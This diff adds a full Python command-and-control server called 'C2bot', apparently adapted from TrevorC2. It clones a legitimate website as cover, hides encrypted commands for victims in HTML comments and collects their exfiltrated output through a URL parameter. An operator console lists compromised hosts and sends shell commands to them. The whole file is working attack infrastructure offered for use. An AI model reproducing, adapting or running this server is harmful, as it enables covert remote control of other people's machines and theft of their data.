@@ -1,0 +1,480 @@
+#!/usr/bin/env python3
+
+
+# CONFIG CONSTANTS:
+URL = ("https://www.google.com")  # URL to clone to house a legitimate website
+USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
+
+# THIS IS WHAT PATH WE WANT TO HIT FOR CODE - THIS CAN BE WHATEVER PATH YOU WANT
+ROOT_PATH_QUERY = ("/")
+
+# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
+SITE_PATH_QUERY = ("/images")
+
+# THIS IS THE QUERY STRING PARAMETER USED
+QUERY_STRING = ("guid=")
+
+# THIS IS THE NAME USED IN THE COOKIE FOR THE COMMUNICATION SESSIONID
+COOKIE_SESSIONID_STRING = ("sessionid")
+
+# THIS IS THE LENGTH OF THE COMMUNICATION SESSIONID
+COOKIE_SESSIONID_LENGTH = (15)
+
+# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
+STUB = ("oldcss=")
+
+# Turn to True for SSL support
+SSL = False
+CERT_FILE = ("")  # Your Certificate for SSL
+
+# THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
+CIPHER = ("r#Rty4y$%Y#R234Yw54yh5YH3t@3t4%45y@$T2t$%Yw45Y45Y34t@#t#$Tt3t42t23T24ty#%Y45U56j%&iI5e")
+
+# Response for website when browsing directories that do not exist if directly going to SITE_PATH_QUERY
+NOTFOUND=("Page not found.")
+
+# Redirect the victim if browsing website to the cloned URL instead of presenting it. ON/OFF
+REDIRECT =("ON")
+
+# DO NOT CHANGE BELOW THIS LINE
+
+import os
+import re
+import ssl
+import sys
+import time
+import glob
+import base64
+try: import bleach
+except ImportError:
+    print("[!] Python module bleach not installed. Try pip install bleach and re-run C2bot Server.")
+    sys.exit()
+import shutil
+import logging
+import urllib3
+import requests
+import threading
+import subprocess
+import collections
+import string
+import random
+try:
+    import tornado.web
+    import tornado.ioloop
+    import tornado.httpserver
+except ImportError:
+    print("[!] Python module tornado not installed. Try pip install tornado and re-run C2bot Server.")
+    sys.exit()
+import hashlib
+from Crypto import Random
+from Crypto.Cipher import AES
+
+# asyncio is python3 only - only needed for python3 regardless for tornado fix
+python_version = ("")
+try: import asyncio
+except ImportError: python_version = "v2"
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+logging.getLogger("tornado.general").setLevel(logging.CRITICAL)
+logging.getLogger('urllib3').setLevel(logging.WARNING)
+logging.basicConfig(level=logging.CRITICAL, format='[%(asctime)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+log = logging.getLogger(__name__)
+
+__author__ = 'kunoh'
+__version__ = 0.1
+
+# ROOT CHECK
+if os.geteuid() != 0:
+    print("\n[!] C2bot needs to be run as root (web socket binding, etc.)... Re-run C2bot as sudo/root in order to run.")
+    sys.exit()
+
+# python 2/3 compatibility
+try: input = raw_input
+except NameError: pass
+
+# used for registering assets
+assets = []
+def register_assets(sessionid,hostname,remoteip):
+    global assets
+    asset = {'sessionid': sessionid, 'hostname': hostname, 'remoteip' : remoteip}
+    assets.append(asset)
+
+def randomString():
+    """Generate a random string of fixed length """
+    letters = string.ascii_letters
+    return ''.join(random.choice(letters) for i in range(COOKIE_SESSIONID_LENGTH))
+
+# AESCipher Library Python2/3 support - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
+class AESCipher(object):
+    """
+    A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
+    Also ensure the coherence and the type of the data with a unicode to byte converter.
+    """
+    def __init__(self, key):
+        self.bs = 16
+        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()
+
+    @staticmethod
+    def str_to_bytes(data):
+        u_type = type(b''.decode('utf8'))
+        if isinstance(data, u_type):
+            return data.encode('utf8')
+        return data
+
+    def _pad(self, s):
+        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))
+
+    @staticmethod
+    def _unpad(s):
+        return s[:-ord(s[len(s)-1:])]
+
+    def encrypt(self, raw):
+        raw = self._pad(AESCipher.str_to_bytes(raw))
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')
+
+    def decrypt(self, enc):
+        enc = base64.b64decode(enc)
+        iv = enc[:AES.block_size]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
+
+# add cipher key here
+cipher = AESCipher(key=CIPHER)
+
+instructionsdict = {}
+def set_instruction(sessionid,instruction):
+    instruction_enc = cipher.encrypt(instruction.encode())
+    instructionsdict[sessionid] = instruction_enc
+
+def htc(m):
+    """Decode URL for Postbacks."""
+    return chr(int(m.group(1), 16))
+
+
+def urldecode(url):
+    """URL Decode."""
+    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
+    return rex.sub(htc, url)
+
+
+def clone_site(user_agent, url):
+    """Our clone site function, to get the site we want to serve.
+
+    :params user_agent = User Agent to grab the site with.
+    :params url = URL if the site you want to clone.
+    """
+    # auto remove old site
+    if os.path.isdir("clone_site/"):
+        for filename in glob.glob(os.path.abspath("clone_site/*")):
+            if os.path.isdir(filename):
+                shutil.rmtree(filename)
+            else:
+                os.remove(filename)
+    else:
+        os.makedirs("clone_site/")
+
+    # run our wget
+    print("[*] Cloning website: " + url)
+    try:
+        web_request = requests.get(url, headers={'User-Agent': user_agent}, verify=0)
+        if web_request.status_code != 200 or len(web_request.content) < 1:
+            print("[!] Unable to clone the site. Status Code: %s" % web_request.status_code)
+            print("[!] Exiting C2bot...")
+            sys.exit()
+
+        with open("clone_site/index.html", 'wb') as fh:
+            fh.write(web_request.content)
+
+    except requests.ConnectionError:
+        print("[-] Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you...")
+        with open("clone_site/index.html", "w") as fh: fh.write("<head></head><html><body>It Works!</body></html>")
+
+    # report success
+    if os.path.isfile("clone_site/index.html"):
+        print("[*] Site cloned successfully.")
+
+
+class UnknownPageHandler(tornado.web.RequestHandler):
+    """No Endpoint Handler."""
+
+    def get(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Request to Invalid Page from {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        if REDIRECT.lower() == ("on"):
+            self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
+        else:
+            site_data = open("clone_site/index.html", "r").read()
+            self.write(site_data)
+            #self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
+        return
+
+    def put(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type PUT identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
+
+    def post(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type POST identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
+
+class RPQ(tornado.web.RequestHandler):
+    """Output IP address and close."""
+
+    def get(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Request to C2 Request Handler from {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        site_data = open("clone_site/index.html", "r").read()
+        # if we get assigned a cookie value or not
+        cookie_value = 0
+        if self.get_cookie(COOKIE_SESSIONID_STRING):
+            sid = self.get_cookie(COOKIE_SESSIONID_STRING)
+            instructions = instructionsdict[sid]
+            cookie_value = 1
+        else:
+            instructions = ("")
+            print("[!] Somebody without a cookie accessed the website from {}".format(remote_ip))
+
+        # If we want to redirect them to the site we cloned instead of showing them a cloned copy of the site
+        if REDIRECT.lower() == ("on") and cookie_value == 0:
+                self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
+        else:
+            site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
+            self.write(str(site_data))
+
+    def put(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type PUT identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
+
+    def post(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type POST identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
+
+class SPQ(tornado.web.RequestHandler):
+    """Output IP address and close."""
+    def get(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Request to C2 Response Handler from {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+
+        args = self.request.arguments
+        if not args:
+            self.write('%s\r\n' % (NOTFOUND))
+            return
+        for param in args:
+            if param in (QUERY_STRING):
+                query = args[param][0]
+        if not self.get_cookie(COOKIE_SESSIONID_STRING):
+            sid = randomString()
+            self.set_cookie(COOKIE_SESSIONID_STRING, sid)
+        else:
+            sid = self.get_cookie(COOKIE_SESSIONID_STRING)
+        if not sid:
+            return
+        if not query:
+            return
+        query = base64.b64decode(query)
+        query_output = cipher.decrypt(query)
+
+        # register hostnames
+        if "magic_hostname=" in query_output:
+            hostname = query_output.split("=")[1]
+            register_assets(sid,hostname,remote_ip)
+            set_instruction(sid,"nothing")
+            print("\n*** Received connection from {} and hostname {} with communication sid {} for C2bot.".format(remote_ip, hostname,sid))
+        else:
+            hostname = query_output.split("::::")[0]
+            data = query_output.split("::::")[1]
+            with open("clone_site/received_" + sid + ".txt", "w") as fh:
+                fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
+            set_instruction(sid,"nothing")
+
+def main_c2():
+    """Start C2 Server."""
+    application = tornado.web.Application([
+        (ROOT_PATH_QUERY, RPQ),
+        (SITE_PATH_QUERY, SPQ),
+        (r'/.*', UnknownPageHandler)  # Make this the last line, if not matched, will hit this rule.
+    ])
+
+    try:
+        if SSL:
+            http_server = tornado.httpserver.HTTPServer(application, ssl_options={'certfile': CERT_FILE, 'ssl_version': ssl.PROTOCOL_TLSv1})
+            http_server.listen(443)
+            tornado.ioloop.IOLoop.instance().start()
+        else:
+            # if we are using pythonv3+
+            if python_version != "v2": asyncio.set_event_loop(asyncio.new_event_loop())
+            http_server = tornado.httpserver.HTTPServer(application)
+            http_server.listen(80)
+            tornado.ioloop.IOLoop.instance().start()
+            http_server.start()
+
+    except Exception as e:
+        if "Address already in use" in str(e):
+            print("[!] Something is already listening on the port. Stop the service and try again (hint service apache2 stop).")
+            os._exit(1) # need os._exit() vs sys.exit due to inside of thread
+        else:
+            print("[!] Something went wrong, printing error message here: " + str(e))
+
+if __name__ == "__main__":
+
+#     print(r"""
+
+#            ,  .'''''.  ...    ''''',  .'
+#             ','     ,.MMMM;.;'      '.
+#              ;;    ;MMMMMMMMM;     ;;'
+#             :'M:  ;MMMMMMMMMMM;.  :M':
+#             : M:  MMMMMMMMMMMMM:  :M  .
+#            .' M:  MMMMMMMMMMMMM:  :M. ;
+#            ; :M'  :MMMMMMMMMMMM'  'M: :
+#            : :M: .;"MMMMMMMMM":;. ,M: :
+#            :  ::,MMM;.M":::M.;MMM ::' :
+#          ,.;    ;MMMMMM;:MMMMMMMM:    :,.
+#          MMM.;.,MMMMMMMM;MMMMMMMM;.,;.MMM
+#          M':''':MMMMMMMMM;MMMMMMMM: "': M
+#          M.:   ;MMMMMMMMMMMMMMMMMM;   : M
+#          :::   MMMMMMMMMMM;MMMMMMMM   ::M
+#         ,'';   MMMMMMMMMMMM:MMMMMMM   :'".
+#       ,'   :   MMMMMMMMMMMM:MMMMMMM   :   '.
+#      '     :  'MMMMMMMMMMMMM:MMMMMM   ;     '
+#      ,.....;.. MMMMMMMMMMMMM:MMMMMM ..:....;.
+#      :MMMMMMMM MMMMMMMMMMMMM:MMMMMM MMMMMMMM:
+#      :MM''':"" MMMMMMMMMMMMM:MMMMMM "": "'MM:
+#       MM:   :  MMMMMMMMMMMMM:MMMMMM  ,'  :MM
+#       'MM   :  :MMMMMMMMMMMM:MMMMM:  :   ;M:
+#        :M;  :  'MMMMMMMMMMMMMMMMMM'  :  ;MM
+#        :MM. :   :MMMMMMMMMM;MMMMM:   :  MM:
+#         :M: :    MMMMMMMMM'MMMMMM'   : :MM'
+#         'MM :    "MMMMMMM:;MMMMM"   ,' ;M"
+#          'M  :    ""''':;;;'''""    :  M:
+#          ;'  :     "MMMMMMMM;."     :  "".
+#        ,;    :      :MMMMMMM:;.     :    '.
+#       :'     :    ,MM'''""''':M:    :     ';
+#      ;'      :    ;M'         MM.   :       ;.
+#    ,'        :    "            "'   :        '.
+#    '        :'                       '        ''
+#  .          :                        '          '
+# '          ;                          ;          '
+#           ;                            '
+
+
+# """)
+    print("C2bot - Legitimate Website Covert Channel")
+    print("Written by: kunnoh")
+    clone_site(USER_AGENT, URL)
+    PYTHONVER = sys.version_info[0]
+    print('[*] Starting C2bot Server...')
+    threading.Thread(target=main_c2).start()
+    print("[*] Next, enter the command you want the victim to execute.")
+    print("[*] Client uses random intervals, this may take a few.")
+    print("[*] Type help for usage. Example commands, list, interact.\n")
+    try:
+        while 1:
+            task = input("C2bot>")
+            if task == "help" or task == "?":
+                print("*** C2bot Help Menu ***\n\n")
+                print("Command Usage:\n")
+                print("list - will list all shells available")
+                print("interact <id> - allow you to select which shells to interact with\n")
+                print("ifconfig - allows you to see your interface data for server")
+
+            # list available shells
+            elif task == "list":
+                counter = 0
+                print("\n*** Available C2bot Shells Below ***\n")
+                if assets == []:
+                    print("No available C2bot shells.")
+                else:
+                    print("Format: <session_id> <hostname>:<ipaddress>:<communication_sessionid>\n")
+                    for a in assets:
+                        counter = counter + 1
+                        print(str(counter) + ". " + a['hostname'] + " " + a['remoteip'] + " " + a['sessionid']  + " (C2bot Established)")
+                print("\n")
+
+            elif task == "interact": print("[!] Correct usage: interact <session_id>")
+
+            elif task == "ifconfig":
+                stdout = subprocess.Popen("ifconfig", shell=True)
+                proc = stdout.communicate()[0]
+                print(proc)
+
+            elif task == "quit" or task == "exit":
+                print("[*] Exiting C2bot... ")
+                os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
+
+            elif "interact " in task:
+                if assets != []:
+                    hostname_sessionid = task.split(" ")[1]
+                    try:
+                        hostname_select = int(hostname_sessionid) - 1
+                    except ValueError:
+                        hostname_select = hostname_sessionid
+                    if isinstance(hostname_select, int):
+                        if (hostname_select < len(assets)) and (hostname_select > -1):
+                            hostname = assets[hostname_select]['hostname']
+                            sid = assets[hostname_select]['sessionid']
+                            print("\n*** interact with {} {}.".format(hostname,sid))
+                            print("[*] Dropping into trevorc2 shell...")
+                            print("[*] Use exit or back to select other shells")
+                            while 1:
+                                task = input(hostname + ":C2bot>")
+                                origtask = task
+                                if task == "quit" or task == "exit" or task == "back": break
+                                task = (hostname + "::::" + task)
+                                set_instruction(sid,task)
+                                if origtask == "killnow":
+                                    print("[*] Killing agent, and dropping from console!")
+                                    break
+                                print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
+                                while 1:
+                                    # we received a hit with our command
+                                    if os.path.isfile("clone_site/received_" + sid + ".txt"):
+                                        data = open("clone_site/received_" + sid + ".txt", "r").read()
+                                        print("[*] Received response back from client...")
+                                        print(data)
+                                        # remove this so we don't use it anymore
+                                        os.remove("clone_site/received_" + sid + ".txt")
+                                        break
+                                    time.sleep(.3)
+                        else :
+                             print("[!] Session id {} does not exist.".format(hostname_sessionid))
+                    else :
+                         print("[!] Session id {} is not a valid session id.".format(hostname_sessionid))
+                else:
+                    print("[!] No sessions have been established to execute commands.")
+
+            else:
+                if task !="":
+                    print("[!] Command not recognized. Type help for more information.")
+
+    # cleanup when using keyboardinterrupt
+    except KeyboardInterrupt:
+        if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
+        print("\n\n[*] Exiting C2bot, covert C2 over legitimate HTTP(s).")
+        os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
